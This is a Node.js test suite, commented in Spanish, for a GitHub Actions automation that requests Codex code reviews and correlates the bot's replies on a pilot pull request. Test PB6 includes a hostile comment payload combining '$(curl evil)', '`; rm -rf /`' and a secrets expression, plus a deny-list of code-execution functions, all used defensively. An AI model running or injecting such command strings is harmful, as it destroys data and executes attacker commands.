// Pruebas de la preparación de la Fase B (#41). Sin red, sin modelos y sin escrituras reales: la API de GitHub es un doble en memoria.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { createRequire } from 'node:module';
import * as pb from '../automation/phaseb/phaseb.mjs';
import { loadPolicy, analyzeUses } from '../automation/preflight/preflight.mjs';

const policy = loadPolicy(); const REPO = policy.repository; const A = policy.auditor; const W = policy.stateWriter; const OWNER = policy.owners[0];
const root = new URL('..', import.meta.url).pathname; const SHA = 'a'.repeat(40); const PR = 77;
const fixture = (n) => JSON.parse(fs.readFileSync(`${root}automation/phaseb/fixtures/${n}.json`, 'utf8'));
const clone = (x) => JSON.parse(JSON.stringify(x));
const ENV = { GITHUB_REF: 'refs/heads/main', GITHUB_RUN_ATTEMPT: '1', GITHUB_ACTOR_ID: String(OWNER.id), GITHUB_RUN_ID: '123456' };
const botUser = { login: A.login, id: A.id, type: A.type }; const writerUser = { login: W.login, id: W.id, type: W.type };
const T0 = '2026-10-21T10:00:00Z';

// ── doble en memoria de la API ─────────────────────────────────────────────────────────────────────────
function world(o = {}) {
  const w = {
    pr: { state: 'open', merged: false, base: { ref: 'main', repo: { full_name: REPO }, sha: 'b'.repeat(40) }, head: { ref: 'phaseb/probe', sha: SHA, repo: { full_name: REPO } }, user: { login: OWNER.login, id: OWNER.id }, ...(o.pr ?? {}) },
    files: 'files' in o ? o.files : [{ filename: pb.SYNTH_FILE, status: 'added', changes: 1 }], comments: o.comments ?? [], reviews: o.reviews ?? [], inline: o.inline ?? [], reactions: o.reactions ?? [],
    postStatus: o.postStatus ?? 201, postThrows: o.postThrows ?? false, postedAs: o.postedAs ?? writerUser, calls: [], headAfterPost: o.headAfterPost,
  };
  w.api = async (method, p, body) => {
    w.calls.push([method, p, body]);
    const json = (status, j) => ({ status, json: j }); const page = (arr) => json(200, arr);
    if (method === 'POST') {
      if (w.postThrows) throw new Error('ECONNRESET');
      if (!/\/issues\/\d+\/comments$/.test(p)) return json(404, {});
      if (w.postStatus !== 201) return json(w.postStatus, {});
      const c = { id: 5000, node_id: 'IC_req', created_at: T0, user: w.postedAs, body: body.body }; w.comments.push(c); return json(201, c);
    }
    if (/\/pulls\/\d+$/.test(p)) return json(200, w.pr);
    if (/\/pulls\/\d+\/files/.test(p)) return w.files === null ? json(500, {}) : page(w.files);
    if (/\/issues\/\d+\/comments/.test(p)) return page(w.comments);
    if (/\/pulls\/\d+\/reviews/.test(p)) return page(w.reviews);
    if (/\/pulls\/\d+\/comments/.test(p)) return page(w.inline);
    if (/\/issues\/\d+\/reactions/.test(p)) return page(w.reactions);
    const m = /\/issues\/comments\/(\d+)$/.exec(p); if (m) return json(200, w.comments.find((c) => c.id === Number(m[1])));
    return json(404, {});
  };
  return w;
}
const reqComment = (o = {}) => ({ id: 5000, created_at: T0, user: writerUser, body: pb.requestBody(SHA, '123456'), ...o });
const plan = (w, over = {}) => pb.plan({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy, ...over });
const writes = (w) => w.calls.filter(([m]) => m !== 'GET');

test('PB1 plan: PR sintética válida → ok; cada desviación → rechazo con su razón', async () => {
  assert.deepEqual((await plan(world())).reasons, []);
  const bad = {
    pr_not_open: { pr: { state: 'closed' } }, pr_not_open_merged: { pr: { merged: true } }, base_not_main: { pr: { base: { ref: 'dev', repo: { full_name: REPO } } } },
    fork_or_foreign_head: { pr: { head: { ref: 'phaseb/x', sha: SHA, repo: { full_name: 'otro/fork' } } } }, head_branch_prefix: { pr: { head: { ref: 'feature/x', sha: SHA, repo: { full_name: REPO } } } },
    pr_author_not_owner: { pr: { user: { login: 'otro', id: 1 } } }, head_sha_mismatch: { pr: { head: { ref: 'phaseb/x', sha: 'c'.repeat(40), repo: { full_name: REPO } } } },
    files_outside_synthetic_scope_dir: { files: [{ filename: 'apps/web/src/x.js', status: 'added', changes: 1 }] }, files_outside_synthetic_scope_two: { files: [{ filename: pb.SYNTH_FILE, status: 'added', changes: 1 }, { filename: 'automation/x.txt', status: 'added', changes: 1 }] },
    files_outside_synthetic_scope_mod: { files: [{ filename: pb.SYNTH_FILE, status: 'modified', changes: 1 }] }, files_outside_synthetic_scope_big: { files: [{ filename: pb.SYNTH_FILE, status: 'added', changes: 500 }] },
    files_outside_synthetic_scope_workflow: { files: [{ filename: '.github/workflows/x.yml', status: 'added', changes: 1 }] }, files_unreadable: { files: null },
    request_already_exists: { comments: [reqComment()] }, codex_mention_present: { comments: [{ id: 1, user: { login: 'cero-absoluto', id: OWNER.id, type: 'User' }, body: 'hola @Codex review' }] },
    codex_activity_present_comment: { comments: [{ id: 2, user: botUser, body: 'x' }] }, codex_activity_present_review: { reviews: [{ id: 3, user: botUser, commit_id: SHA }] }, codex_activity_present_inline: { inline: [{ id: 4, user: botUser }] },
  };
  for (const [name, o] of Object.entries(bad)) { const r = await plan(world(o)); assert.equal(r.ok, false, name); assert.ok(r.reasons.includes(name.replace(/_(dir|two|mod|big|workflow|merged|comment|review|inline)$/, '')), `${name}: ${r.reasons}`); }
  for (const [name, env, extra] of [['ref_not_main', { ...ENV, GITHUB_REF: 'refs/heads/otra' }], ['rerun_not_allowed', { ...ENV, GITHUB_RUN_ATTEMPT: '2' }], ['actor_not_owner', { ...ENV, GITHUB_ACTOR_ID: '1' }]]) assert.ok((await plan(world(), { env })).reasons.includes(name), name);
  assert.ok((await plan(world(), { expectedSha: 'abc' })).reasons.includes('bad_expected_sha'));
  assert.ok((await plan(world(), { pr: -3 })).reasons.includes('bad_pr_number'));
  assert.equal(writes(world()).length, 0); const w = world(); await plan(w); assert.equal(writes(w).length, 0, 'plan no escribe');
});

test('PB2 send: UNA sola petición, cuerpo exacto con marcador; revalida; sin reintentos ante 4xx/5xx/red; identidad del autor registrada', async () => {
  let w = world(); let r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy });
  assert.equal(r.sent, true); assert.equal(writes(w).length, 1); const [m, p, b] = writes(w)[0];
  assert.equal(m, 'POST'); assert.equal(p, `/repos/${REPO}/issues/${PR}/comments`); assert.deepEqual(Object.keys(b), ['body']);
  assert.equal(b.body, `@codex review el commit exacto \`${SHA}\`\n\n<!-- phaseb-request:v1 sha=${SHA} run=123456 attempt=1 -->`);
  assert.deepEqual([r.request_comment_id, r.request_created_at, r.head_sha, r.run_id, r.pr], [5000, T0, SHA, '123456', PR]);
  assert.equal(r.author_is_state_writer, true); assert.deepEqual(r.author, writerUser);
  w = world({ postedAs: { login: 'otro', id: 5, type: 'User' } }); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); assert.equal(r.author_is_state_writer, false, 'si el autor no es github-actions[bot], se registra');
  for (const [status, state] of [[403, 'not_created'], [404, 'not_created'], [422, 'not_created'], [500, 'unknown'], [502, 'unknown']]) { w = world({ postStatus: status }); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); assert.equal(r.sent, false, String(status)); assert.equal(r.state, state, String(status)); assert.equal(writes(w).length, 1, `sin reintento ante ${status}`); }
  w = world({ postThrows: true }); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); assert.equal(r.state, 'unknown'); assert.equal(writes(w).length, 1, 'sin reintento ante error de red'); assert.match(r.note, /no se reintenta/);
  w = world({ pr: { head: { ref: 'phaseb/x', sha: 'c'.repeat(40), repo: { full_name: REPO } } } }); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); assert.equal(r.state, 'refused'); assert.equal(writes(w).length, 0, 'cabeza cambiada: no publica');
  w = world({ comments: [reqComment()] }); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); assert.equal(r.state, 'refused'); assert.equal(writes(w).length, 0, 'deduplicación: ya hay petición');
  w = world(); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: { ...ENV, GITHUB_RUN_ATTEMPT: '2' }, policy }); assert.equal(writes(w).length, 0, 'un re-run no publica');
  w = world(); r = await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: { ...ENV, GITHUB_RUN_ID: 'x' }, policy }); assert.equal(writes(w).length, 0, 'sin run id válido no publica');
});

// ── receptor ───────────────────────────────────────────────────────────────────────────────────────────
const codexComment = (o = {}) => ({ id: 9001, node_id: 'IC_s', user: botUser, created_at: '2026-10-21T10:00:30Z', body: `<!-- codex-review-receipt:v1 -->\n\n**Reviewed commit:** \`${SHA.slice(0, 10)}\``, performed_via_github_app: { id: A.appId }, ...o });
const codexReview = (o = {}) => ({ id: 9101, node_id: 'PRR_s', user: botUser, commit_id: SHA, submitted_at: '2026-10-21T10:01:00Z', ...o });
const evComment = (o = {}) => { const e = clone(fixture('event-issue-comment-created')); e.comment = { ...e.comment, ...o }; return e; };
const evReview = (o = {}) => { const e = clone(fixture('event-pull-request-review-submitted')); e.review = { ...e.review, ...o }; return e; };
const recv = (w, eventName, event, over = {}) => pb.receive({ api: w.api, eventName, event, repository: REPO, activePr: String(PR), env: ENV, policy, ...over });
const goodWorld = (o = {}) => world({ comments: [reqComment(), codexComment()], reviews: [codexReview()], ...o });

test('PB3 receptor: correlación completa → RECEIVED_OK con ids, SHA y run; recibo (issue_comment) y review (pull_request_review)', async () => {
  let w = goodWorld(); let r = await recv(w, 'issue_comment', evComment());
  assert.equal(r.classification, 'RECEIVED_OK'); assert.deepEqual([r.event_id, r.request_comment_id, r.head_sha, r.run_id, r.request_run_id, r.kind], [9001, 5000, SHA, '123456', '123456', 'comment']); assert.equal(r.seconds_after_request, 30);
  w = goodWorld({ comments: [reqComment()] }); r = await recv(w, 'pull_request_review', evReview());
  assert.equal(r.classification, 'RECEIVED_OK'); assert.deepEqual([r.event_id, r.kind, r.head_sha], [9101, 'review', SHA]);
  assert.equal(writes(w).length, 0, 'el receptor no escribe nada');
  const e = evComment(); e.action = 'edited'; w = goodWorld(); assert.equal((await recv(w, 'issue_comment', e)).classification, 'RECEIVED_EDIT', 'edición del recibo ganador: informativa');
});
test('PB4 receptor: filtro temprano e identidad — todo lo demás se ignora o queda sin correlacionar, nunca como éxito', async () => {
  const w = goodWorld(); const cases = {
    unsupported_event: ['pull_request', evComment()], wrong_repository: ['issue_comment', { ...evComment(), repository: { full_name: 'otro/repo' } }],
    not_pilot_pr: ['issue_comment', { ...evComment(), issue: { number: 78, pull_request: {} } }], not_a_pull_request: ['issue_comment', { ...evComment(), issue: { number: PR } }],
    wrong_actor_human: ['issue_comment', evComment({ user: { login: 'cero-absoluto', id: OWNER.id, type: 'User' } })], wrong_actor_writer: ['issue_comment', evComment({ user: writerUser })],
    wrong_actor_type: ['issue_comment', evComment({ user: { ...botUser, type: 'User' } })], wrong_actor_id: ['issue_comment', evComment({ user: { ...botUser, id: 1 } })],
    wrong_sender: ['issue_comment', { ...evComment(), sender: writerUser }], wrong_app: ['issue_comment', evComment({ performed_via_github_app: { id: 1236702 } })],
    unsupported_action: ['issue_comment', { ...evComment(), action: 'deleted' }], review_wrong_actor: ['pull_request_review', evReview({ user: writerUser })],
  };
  for (const [name, [en, ev]] of Object.entries(cases)) { const r = await recv(w, en, ev); assert.equal(r.classification, 'IGNORED', name); assert.ok(r.reason, name); }
  assert.equal((await recv(w, 'issue_comment', evComment(), { activePr: '' })).reason, 'no_active_pilot');
  assert.equal((await recv(w, 'issue_comment', evComment(), { activePr: 'abc' })).reason, 'no_active_pilot');
  assert.equal(w.calls.length, 0, 'el filtro temprano no hace ninguna llamada a la API');
});
test('PB5 receptor: correlación — recibo previo, commit distinto, sin marcador, marcador falsificado, ambiguo, caducado, PR cambiada, contenido fuera de alcance, duplicado', async () => {
  const U = async (w, ev = evComment(), en = 'issue_comment') => recv(w, en, ev);
  const base = { classification: 'UNCORRELATED' };
  let r = await U(goodWorld({ comments: [reqComment({ created_at: '2026-10-21T10:05:00Z' }), codexComment()] })); assert.deepEqual([r.classification, r.reason], ['UNCORRELATED', 'preexisting_before_request'], 'recibo ANTERIOR a la petición');
  r = await U(goodWorld({ comments: [reqComment(), codexComment()] }), evComment({ body: `<!-- codex-review-receipt:v1 -->\n\n**Reviewed commit:** \`${'b'.repeat(10)}\`` })); assert.equal(r.reason, 'wrong_commit');
  r = await U(goodWorld(), evComment({ body: 'Codex Review: nada que decir' })); assert.equal(r.reason, 'not_a_receipt');
  r = await U(goodWorld(), evComment({ body: '<!-- codex-review-receipt:v1 -->\n\nsin commit' })); assert.equal(r.reason, 'no_commit_in_comment');
  r = await U(world({ comments: [codexComment()] })); assert.equal(r.reason, 'no_request_marker');
  r = await U(world({ comments: [reqComment({ user: { login: 'cero-absoluto', id: OWNER.id, type: 'User' } }), codexComment()] })); assert.equal(r.reason, 'no_request_marker', 'marcador de un humano no vale');
  r = await U(world({ comments: [reqComment(), reqComment({ id: 5001 }), codexComment()] })); assert.equal(r.reason, 'ambiguous_request');
  r = await U(world({ comments: [reqComment(), reqComment({ id: 5001, user: { login: 'x', id: 9, type: 'User' } }), codexComment()] })); assert.equal(r.reason, 'ambiguous_request', 'marcador duplicado/falsificado: se rechaza');
  r = await U(goodWorld({ comments: [reqComment(), codexComment({ created_at: '2026-10-21T10:31:00Z' })] }), evComment({ created_at: '2026-10-21T10:31:00Z' })); assert.equal(r.reason, 'expired');
  r = await U(goodWorld({ pr: { head: { ref: 'phaseb/x', sha: 'c'.repeat(40), repo: { full_name: REPO } } } })); assert.equal(r.reason, 'pr_changed');
  r = await U(goodWorld({ pr: { state: 'closed' } })); assert.equal(r.reason, 'pr_closed');
  r = await U(goodWorld({ files: [{ filename: 'apps/x.js', status: 'added' }] })); assert.equal(r.reason, 'unsafe_pr_content');
  r = await U(goodWorld({ comments: [reqComment(), codexComment()], reviews: [codexReview({ commit_id: 'd'.repeat(40) })] }), evReview({ commit_id: 'd'.repeat(40) }), 'pull_request_review'); assert.equal(r.reason, 'wrong_commit', 'review de otro commit');
  // duplicado: dos recibos correlacionados → solo el primero es RECEIVED_OK
  const w = goodWorld({ comments: [reqComment(), codexComment(), codexComment({ id: 9002, created_at: '2026-10-21T10:02:00Z' })] });
  assert.equal((await recv(w, 'issue_comment', evComment())).classification, 'RECEIVED_OK');
  r = await recv(w, 'issue_comment', evComment({ id: 9002, created_at: '2026-10-21T10:02:00Z' })); assert.deepEqual([r.classification, r.reason, r.first_match], ['DUPLICATE', 'not_first_correlated_event', { kind: 'comment', id: 9001 }]);
  // una review anterior que el recibo: el recibo es duplicado
  const w2 = goodWorld({ comments: [reqComment(), codexComment({ created_at: '2026-10-21T10:03:00Z' })], reviews: [codexReview()] }); r = await recv(w2, 'issue_comment', evComment({ created_at: '2026-10-21T10:03:00Z' })); assert.equal(r.classification, 'DUPLICATE');
  for (const x of [w, w2]) assert.equal(writes(x).length, 0);
  assert.ok(base);
});
test('PB6 receptor: el evento es dato — el módulo no ejecuta ni evalúa nada; el texto hostil de un comentario solo se compara, nunca se interpreta', async () => {
  const src = fs.readFileSync(`${root}automation/phaseb/phaseb.mjs`, 'utf8');
  assert.doesNotMatch(src, /child_process|\beval\(|new Function|\bexecSync\(|\bexecFile|\bspawn(Sync)?\(|import\(|require\(|process\.binding/);
  const hostile = '$(curl evil)`; rm -rf /` ${{ secrets.X }} <!-- phaseb-request:v1 sha=' + SHA + ' run=1 attempt=1 -->';
  const w = goodWorld(); const r = await recv(w, 'issue_comment', evComment({ body: hostile })); assert.equal(r.classification, 'UNCORRELATED'); assert.equal(writes(w).length, 0);
  assert.ok(!JSON.stringify(r).includes('curl evil'), 'el registro no copia texto del comentario');
});
test('PB7 observe: respuesta de Codex visible por API ≠ evento recibido; reacción sola; sin respuesta; sin petición', async () => {
  const obs = (w) => pb.observe({ api: w.api, repository: REPO, pr: PR, policy });
  let r = await obs(goodWorld()); assert.equal(r.api_visible_response, true); assert.equal(r.reaction_only, false); assert.deepEqual(r.codex.map((e) => [e.kind, e.id, e.exact_commit]), [['comment', 9001, true], ['review', 9101, true]]); assert.match(r.interpretation, /comparar con los registros de receive/);
  r = await obs(world({ comments: [reqComment()], reactions: [{ id: 7, user: botUser, content: '+1', created_at: '2026-10-21T10:00:20Z' }] })); assert.deepEqual([r.api_visible_response, r.reaction_only], [false, true]); assert.match(r.interpretation, /no genera evento/);
  r = await obs(world({ comments: [reqComment()] })); assert.deepEqual([r.api_visible_response, r.reaction_only, r.codex.length], [false, false, 0]); assert.match(r.interpretation, /no demuestra/);
  r = await obs(world({ comments: [codexComment()] })); assert.equal(r.api_visible_response, false); assert.equal(r.request.error, 'no_request_marker');
  r = await obs(world({ comments: [reqComment(), codexComment({ created_at: '2026-10-20T09:00:00Z' })] })); assert.equal(r.api_visible_response, false, 'respuesta anterior a la petición: no cuenta');
  r = await obs(world({ comments: [reqComment(), codexComment({ body: `<!-- codex-review-receipt:v1 -->\n\n**Reviewed commit:** \`${'e'.repeat(10)}\`` })] })); assert.equal(r.api_visible_response, false, 'otro commit: no cuenta');
  const w = goodWorld(); await obs(w); assert.equal(writes(w).length, 0);
});

// ── workflows candidatos ───────────────────────────────────────────────────────────────────────────────
const sendPath = `${root}automation/phaseb/candidate/phase-b-send.yml`; const recvPath = `${root}automation/phaseb/candidate/phase-b-receive.yml`;
let YAML; try { YAML = createRequire(`${root}automation/preflight/tools/package.json`)('yaml'); } catch { YAML = null; }
const load = (p) => { assert.ok(YAML, 'instalar la herramienta: npm ci --ignore-scripts --prefix automation/preflight/tools'); const d = YAML.parseAllDocuments(fs.readFileSync(p, 'utf8'), { version: '1.2', uniqueKeys: true }); assert.equal(d.length, 1); assert.deepEqual(d[0].errors, []); return d[0].toJS(); };
const stepsOf = (wf) => Object.values(wf.jobs).flatMap((j) => j.steps ?? []);
test('PB8 emisor: manual, inerte, permisos mínimos (issues:write solo en `send`), acciones fijadas, sin credenciales de modelo ni checkout de la PR', () => {
  const wf = load(sendPath); const text = fs.readFileSync(sendPath, 'utf8');
  assert.deepEqual(Object.keys(wf.on), ['workflow_dispatch']); assert.deepEqual(wf.permissions, {}); assert.deepEqual(Object.keys(wf.jobs), ['precheck', 'send']);
  assert.deepEqual(wf.jobs.send.permissions, { contents: 'read', issues: 'write', 'pull-requests': 'read' }); assert.deepEqual(wf.jobs.precheck.permissions, { contents: 'read', issues: 'read', 'pull-requests': 'read' });
  assert.doesNotMatch(text.replace(/^\s*#.*$/gm, ''), /(contents|pull-requests|actions|checks|statuses|packages|id-token|deployments): write|write-all|secrets\.|id-token|CLAUDE|ANTHROPIC|claude-code-action|pull_request_target/);
  assert.equal(analyzeUses(text).unpinned.length, 0); assert.ok(analyzeUses(text).pinned.length >= 4);
  for (const j of Object.values(wf.jobs)) assert.ok(j['timeout-minutes'] <= 5);
  for (const s of stepsOf(wf).filter((s) => s.uses?.startsWith('actions/checkout'))) { assert.equal(s.with.ref, 'main'); assert.equal(s.with['persist-credentials'], false); }
  assert.equal(wf.concurrency['cancel-in-progress'], false); assert.match(wf.jobs.precheck.if, /refs\/heads\/main/);
  assert.deepEqual(stepsOf(wf).filter((s) => s.run).map((s) => s.run), ['node automation/phaseb/phaseb.mjs plan', 'node automation/phaseb/phaseb.mjs send']);
  assert.equal(JSON.stringify(wf).match(/issues: ?write|"issues":"write"/g).length, 1, 'issues:write aparece una sola vez');
  assert.ok(!fs.existsSync(`${root}.github/workflows/phase-b-send.yml`) && !fs.existsSync(`${root}.github/workflows/phase-b-receive.yml`), 'inertes: fuera de .github/workflows');
});
test('PB9 receptor: filtro temprano (repo, piloto, PR, identidad), solo lectura, sin interpolar el evento en `run:`, sin checkout de la PR', () => {
  const wf = load(recvPath); const text = fs.readFileSync(recvPath, 'utf8'); const code = text.replace(/^\s*#.*$/gm, '');
  assert.deepEqual(Object.keys(wf.on).sort(), ['issue_comment', 'pull_request_review', 'workflow_dispatch']); assert.deepEqual(wf.on.issue_comment.types, ['created', 'edited']); assert.deepEqual(wf.on.pull_request_review.types, ['submitted']);
  assert.deepEqual(wf.permissions, {}); for (const j of Object.values(wf.jobs)) { assert.deepEqual(j.permissions, { contents: 'read', issues: 'read', 'pull-requests': 'read' }); assert.ok(j['timeout-minutes'] <= 5); }
  assert.doesNotMatch(code, /: write|write-all|secrets\.|CLAUDE|ANTHROPIC|claude-code-action|pull_request_target|workflow_run/);
  const f = wf.jobs.receive.if; for (const need of ["github.repository == 'cero-absoluto/vozciudadana'", "vars.PHASEB_PR != ''", 'github.event.issue.pull_request != null', "format('{0}', github.event.issue.number) == vars.PHASEB_PR", "format('{0}', github.event.pull_request.number) == vars.PHASEB_PR", 'github.event.comment.user.id == 199175422', 'github.event.review.user.id == 199175422', "github.event.comment.user.type == 'Bot'", "github.event.review.user.type == 'Bot'"]) assert.ok(f.includes(need), need);
  assert.equal(f.match(/199175422/g).length, 2); assert.equal(loadPolicy().auditor.id, 199175422, 'el id del filtro coincide con la política');
  for (const s of stepsOf(wf)) { if (s.run) { assert.doesNotMatch(s.run, /\$\{\{/, 'nada interpolado en run:'); assert.match(s.run, /^node automation\/phaseb\/phaseb\.mjs (receive|observe)$/); } if (s.uses?.startsWith('actions/checkout')) { assert.equal(s.with.ref, 'main'); assert.equal(s.with['persist-credentials'], false); } }
  for (const s of stepsOf(wf).filter((x) => x.run)) for (const [k, v] of Object.entries(s.env ?? {})) assert.ok(['GITHUB_TOKEN', 'EVENT_NAME', 'PHASEB_PR', 'PR_NUMBER'].includes(k), `env permitido: ${k}`), assert.doesNotMatch(String(v), /github\.event\.(comment|review|issue\.(title|body)|pull_request\.(title|body|head))/);
  assert.match(wf.jobs.observe.if, /workflow_dispatch/); assert.equal(analyzeUses(text).unpinned.length, 0);
  assert.match(wf.concurrency.group, /phase-b-receive-/); assert.equal(wf.concurrency['cancel-in-progress'], false);
});
test('PB10 actionlint no encuentra problemas en los candidatos (si está instalado)', (t) => {
  const v = spawnSync('actionlint', ['-version'], { encoding: 'utf8' }); if (v.status !== 0) { t.skip('actionlint no instalado'); return; }
  const r = spawnSync('actionlint', [sendPath, recvPath], { encoding: 'utf8' }); assert.equal(r.status, 0, r.stdout + r.stderr);
});
test('PB11 alcance: solo automation/ y tests/; no toca .github/workflows, apps/, package.json ni lockfiles, y no activa despliegues', () => {
  const run = (...a) => spawnSync('git', a, { cwd: root, encoding: 'utf8' });
  const base = run('rev-parse', '--verify', 'origin/main'); if (base.status !== 0) return;
  const files = [...run('diff', '--name-only', 'origin/main...HEAD').stdout.split('\n'), ...run('ls-files', '--others', '--exclude-standard').stdout.split('\n'), ...run('diff', '--name-only').stdout.split('\n')].filter(Boolean);
  for (const f of files) assert.ok(/^(automation\/|tests\/)/.test(f), `${f} fuera de automation/ y tests/`);
  const deploy = fs.readFileSync(`${root}.github/workflows/deploy.yml`, 'utf8'); const wanted = ['apps/web/**', 'package.json', '.github/workflows/deploy.yml'];
  for (const w of wanted) assert.ok(deploy.includes(w), `deploy.yml filtra por ${w}`);
  assert.deepEqual(fs.readdirSync(`${root}.github/workflows`).sort(), ['actions-preflight.yml', 'deploy.yml']);
});
test('PB12 documentación: PLAN.md cubre activación, permisos, retirada, límites y la pregunta de la entrega bot→Codex', () => {
  const doc = fs.readFileSync(`${root}automation/phaseb/PLAN.md`, 'utf8');
  for (const re of [/Activaci[oó]n/, /Permisos/, /Retirada/, /PHASEB_PR/, /issues: write/, /no medido|NO se ha medido|solo puede medirse en vivo/i, /cuota/i, /minutos/i, /sin reintentos/i, /phaseb\/synthetic/, /probe\.txt/, /RECEIVED_OK/, /GITHUB_TOKEN/]) assert.match(doc, re, String(re));
  assert.ok(doc.split('\n').length <= 80, 'una página');
});

// Cobertura de permisos (hallazgo r4322327001): cada job debe conceder lo que su comando consulta, o fallaría antes de actuar.
test('PB13 cada job concede los permisos que su comando usa realmente: las rutas GET que recorre plan/send/receive/observe están cubiertas por `permissions`', async () => {
  const scopeOf = (p) => (/\/pulls\//.test(p) ? 'pull-requests' : /\/issues\//.test(p) ? 'issues' : 'contents');
  const need = (calls) => { const n = {}; for (const [m, p] of calls) { const sc = scopeOf(p); n[sc] = m === 'GET' ? n[sc] ?? 'read' : 'write'; } return n; };
  const covers = (perm, n) => Object.entries(n).every(([sc, lvl]) => perm?.[sc] === 'write' || (lvl === 'read' && perm?.[sc] === 'read'));
  let w = world(); await pb.plan({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); const planNeeds = need(w.calls);
  w = world(); await pb.send({ api: w.api, repository: REPO, pr: PR, expectedSha: SHA, env: ENV, policy }); const sendNeeds = need(w.calls);
  w = goodWorld(); await recv(w, 'issue_comment', evComment()); const recvNeeds = need(w.calls);
  w = goodWorld(); await pb.observe({ api: w.api, repository: REPO, pr: PR, policy }); const obsNeeds = need(w.calls);
  assert.deepEqual(planNeeds, { 'pull-requests': 'read', issues: 'read' }); assert.deepEqual(sendNeeds, { 'pull-requests': 'read', issues: 'write' });
  const send = load(sendPath); const rcv = load(recvPath);
  assert.ok(covers(send.jobs.precheck.permissions, planNeeds), 'precheck cubre plan'); assert.ok(covers(send.jobs.send.permissions, sendNeeds), 'send cubre revalidación + publicación');
  assert.ok(covers(rcv.jobs.receive.permissions, recvNeeds), 'receive'); assert.ok(covers(rcv.jobs.observe.permissions, obsNeeds), 'observe');
  assert.equal(send.jobs.send.permissions.contents, 'read'); for (const j of [...Object.values(send.jobs), ...Object.values(rcv.jobs)]) assert.notEqual(j.permissions.contents, 'write');
});
